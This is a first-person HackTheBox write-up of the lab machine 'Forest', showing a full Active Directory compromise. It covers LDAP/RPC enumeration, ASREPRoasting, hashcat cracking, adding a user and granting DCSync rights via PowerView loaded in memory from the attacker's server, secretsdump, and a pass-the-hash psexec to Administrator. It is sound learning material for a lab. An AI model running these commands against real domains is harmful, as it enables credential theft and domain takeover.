---
title: "Forest HTB Write-up"
machine_name: "Forest"
difficulty: "Easy"
os: "Windows"
date_completed: "2025-01-09"
techniques: ["Active Directory", "LDAP Enumeration", "ASREPRoasting", "GetNPUsers", "Bloodhound", "DCSync", "WriteDACL", "Exchange Trusted Subsystem", "PowerView"]
box_ip: "10.10.10.161"
machine_rank: "#212"
htb_completion_image: "forest.webp"
---

This write-up details my journey through the Forest HTB box, following Ippsec's methodology from his video walkthrough. While following his approach, I encountered several differences due to tool updates and version changes that required some troubleshooting. I think documenting these differences might help others who are also learning Active Directory exploitation.

**Note:** This is also my first write-up, so any feedback is appreciated. Before reading, it would be best if you watched Ippsec's video, as some of the write-up assumes you know some information from his walkthrough.

## Box Information
- **Platform:** HackTheBox
- **Operating System:** Windows
- **Domain:** htb.local
- **Date Completed:** January 8, 2025

## Initial Enumeration

The first step will always be your Nmap scan. For this box I ran the same two scans that Ippsec used:

```bash
# Window 1
nmap -sC -sV -v -oA nmap/quick-scan 10.10.10.161

# Window 2 (with delay to avoid conflicts)
sleep 300; nmap -p- -oA nmap/allports 10.10.10.161
```

**Note:** Ippsec says running both at the same time can cause conflicts, so he let the first one run, then setup another terminal and used a sleep command to time his second nmap to run 5 minutes after running the first scan.

### Open Ports and Services

The scan revealed several interesting ports:
- **Port 389** (LDAP)
- **Port 88** (Kerberos)
- **Port 445** (SMB)
- **Port 5985** (WinRM)
- **Port 135** and **139** (RPC)
- **Port 636** (LDAPS)
- **Port 3269** (Global Catalog)
- **Port 464** (Domain Controller related)
- **Port 593** (RPC over HTTP)

## LDAP Enumeration

The first challenge came with LDAP enumeration. The `-h` flag that Ippsec uses in his video is no longer available. Instead, we now need to use `-H` and provide a URI:

```bash
ldapsearch -H ldap://10.10.10.161
```

This prompted me to log in using MD5, and I don't have that information, so I used the `-x` flag to enable simple authentication. I also added the `-s` flag for scope:

**Scope Types:**
- **base:** Only queries the root level directory
- **one:** Queries one level "below" root/base  
- **sub:** Queries all the levels

```bash
ldapsearch -H ldap://10.10.10.161 -x -s base
```

Interestingly, without specifying anything after base, I still got data. This made me realize that the namingcontexts parameter Ippsec used was actually just acting as a filter.

### LDAP Enumeration Commands

```bash
# Query for the domain name
ldapsearch -H ldap://10.10.10.161 -x -s base namingcontexts

# With the acquired domain name, query all LDAP info with anonymous access
ldapsearch -H ldap://10.10.10.161 -x -s sub -b "DC=htb,DC=local"

# Filter for specific object classes
ldapsearch -H ldap://10.10.10.161 -x -s sub -b "DC=htb,DC=local" '(objectClass=Person)' sAMAccountName

# Create clean username list for password spraying
ldapsearch -H ldap://10.10.10.161 -x -s sub -b "DC=htb,DC=local" '(objectClass=Person)' sAMAccountName | grep sAMAccountName | awk '{print $2}' > userlist.ldap
```

### RPC Enumeration

The RPC connection also required a modification — we need to add the `-N` flag to specify no password:

```bash
rpcclient -U '' -N 10.10.10.161
> enumdomusers
> queryusergroups <rid>
> querygroup <rid>
> queryuser <rid>
```

This revealed the **svc-alfresco** user that didn't show up in LDAP enumeration because it wasn't part of the "Person" objectClass.

## ASREPRoasting: When and How

After getting the svc-alfresco user, I decided to skip the password spray (knowing from the video it wouldn't work) and went straight to ASREPRoasting.

### When to Use ASREPRoasting

I found it's most useful when:
1. You've identified a Windows domain environment (Active Directory)
2. You have a list of valid usernames but no passwords
3. You've confirmed Kerberos authentication is running

### Key Indicators for ASREPRoasting
1. Port 389 (LDAP) is open
2. Port 88 (Kerberos) is open  
3. You can enumerate the domain name
4. You've gathered valid usernames through LDAP enumeration
5. Traditional password attacks haven't worked

Here's the modified command I used:

```bash
# Run ASREP Roasting attack
/usr/share/doc/python3-impacket/examples/GetNPUsers.py -request 'htb.local/' -usersfile users.ldap -dc-ip 10.10.10.161 -format hashcat
```

This gave me the hashed password for svc-alfresco. I then used hashcat to crack it:

```bash
hashcat -m 18200 svc-alfresco_hash /usr/share/wordlists/rockyou.txt

# Result: s3rvice
```

### Initial Access

```bash
evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
```

## The SMB Server Saga

Setting up the SMB server for transferring SharpHound.exe turned into quite an adventure. First, I had to modify the command because the `-p` flag was ambiguous:

```bash
# On my local machine
impacket-smbserver sharp $(pwd) -smb2support -user forest -password P@ssword

# Target
$pass = convertto-securestring 'P@ssword' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('forest', $pass)
New-PSDrive -Name mau -PSProvider FileSystem -Credential $cred -Root \\10.10.16.7\sharp
```

This didn't work due to version mismatches. I tried different approaches:

```bash
# Alternative HTTP method
python3 -m http.server 8080

# Target (this failed with syntax errors)
IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.7:8080/SharpHound.exe')
```

I finally got it working by cloning the master branch of Impacket and running the server with Python directly:

```bash
# On my local machine
python3 smbserver.py sharp $(pwd) -smb2support -user forest -password P@ssword

# Target
$pass = convertto-securestring 'P@ssword' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('forest', $pass)
New-PSDrive -Name forest -PSProvider FileSystem -Credential $cred -Root \\10.10.16.7\sharp
```

## Bloodhound: The Path Not Taken

Another interesting divergence came with Bloodhound — the visualization was completely different from Ippsec's video. I noticed a potential PSRemote path that wasn't in the original walkthrough. Although I tried this route for learning purposes:

```bash
$pass = convertto-securestring 'P@ssword' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('forest', $pass)
$session = New-PSSession -ComputerName FOREST.HTB.LOCAL -Credential $cred
```

This resulted in a `LogonFailure,PSSessionOpenFailed` error, leading me back to the guided mode.

## The Final Path to Root

After several attempts trying what Ippsec did, here's what finally worked:

### 1. Create Domain User and Add to Exchange Windows Permissions

```bash
# On target machine (Evil-WinRM session as svc-alfresco):
net user forest P@ss123 /add /domain
net group "Exchange Windows Permissions" forest /add
```

### 2. Add svc-alfresco to Exchange Trusted Subsystem Group

The crucial step I initially missed was adding svc-alfresco to the Exchange Trusted Subsystem group:

```bash
# Add svc-alfresco to Exchange Trusted Subsystem group
Add-ADGroupMember -Identity "Exchange Trusted Subsystem" -Members svc-alfresco
```

### 3. Load PowerView and Set Up DCSync Rights

DCSync rights are particularly powerful in Active Directory environments. When you grant DCSync rights to a user, you're essentially giving them the ability to impersonate a domain controller and request password data for any user in the domain.

```bash
# Attacker Python Server
python3 -m http.server 80

# Target
# Fileless method for PowerView.ps1 (Runs file in memory)
IEX(New-Object Net.WebClient).downloadString('http://10.10.16.7/PowerView.ps1')

# Adds DCSync rights to forest user
Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity forest -Rights DCSync
```

### 4. Dump Hashes and Get Administrator Access

```bash
# On my local machine
# Dump hashes
sudo ./secretsdump.py htb.local/forest:'P@ss123'@10.10.10.161

# Get a shell as administrator
sudo ./psexec.py -hashes <LM HASH>:<NT HASH> administrator@10.10.10.161
```

## Key Learning Points

### Technical Skills Gained
- **ASREPRoasting:** Understanding when and how to use GetNPUsers.py for Kerberos attacks
- **LDAP Enumeration:** Learning different scope levels and updated syntax for ldapsearch
- **DCSync Attacks:** Understanding the power of DCSync rights in AD environments
- **PowerView Usage:** Loading and using PowerView for AD object manipulation
- **Tool Version Management:** Dealing with updated tools and syntax changes

### Methodology Improvements
- **Proper Enumeration:** The importance of checking multiple user enumeration methods (RPC vs LDAP)
- **Tool Updates:** Always check for syntax changes in tools over time
- **Bloodhound Analysis:** Using Bloodhound for privilege escalation path discovery
- **File Transfer Methods:** Multiple approaches for getting tools onto target systems

### Personal Growth Notes
- Writing walkthroughs forces better understanding of each step
- Tool troubleshooting teaches you the underlying mechanisms
- Following Ippsec's methodology while adapting to tool changes improved problem-solving skills

## Attack Chain Summary

1. **LDAP enumeration** reveals domain users (missing svc-alfresco initially)
2. **RPC enumeration** discovers svc-alfresco user
3. **ASREPRoasting** attack yields svc-alfresco hash
4. **Hash cracking** provides svc-alfresco credentials
5. **Initial access** via Evil-WinRM as svc-alfresco
6. **Bloodhound analysis** shows privilege escalation path
7. **Domain user creation** and addition to Exchange Windows Permissions
8. **DCSync rights** granted via PowerView
9. **Hash dumping** via secretsdump.py
10. **Administrator access** via psexec.py with dumped hashes

## Conclusion

This box was an excellent learning experience, especially in dealing with tool updates and troubleshooting. While following Ippsec's methodology was incredibly helpful, the differences I encountered forced me to really understand what each command was doing rather than just copying them.

The box also reinforced the importance of proper enumeration and understanding when to use specific attack techniques like ASREPRoasting. Even though I knew the solution from the video, actually executing it with modern tools required additional problem-solving and understanding.
